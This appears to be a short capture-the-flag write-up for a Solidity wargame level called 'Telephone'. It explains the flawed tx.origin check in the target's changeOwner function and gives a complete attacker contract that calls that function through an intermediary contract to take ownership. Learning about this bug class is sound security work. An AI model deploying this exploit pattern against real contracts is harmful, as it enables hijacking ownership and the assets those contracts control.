# Telephone

First one that I did on my own :D

```solidity
   function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

From StackExchange : 

> With msg.sender the owner can be a contract.

> With tx.origin the owner can never be a contract.

> In a simple call chain A->B->C->D, inside D msg.sender will be C, and tx.origin will be A.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone{
  function changeOwner(address _owner) external;
}

contract hackedTelephone {

  Telephone originalTelephone;
  address myAddr = 0x36b19c3573beE32B810076d195FC15baFC72a562;

  constructor(address _addr){
    originalTelephone = Telephone(_addr);
  }

  function hackTelephone() public {
    originalTelephone.changeOwner(myAddr);
  }
}
```

We will just call changeOwner from Remix IDE. Since it is sent from Remix, tx.origin will be our address. Remix addr -> My addr -> contract method will give us ownership.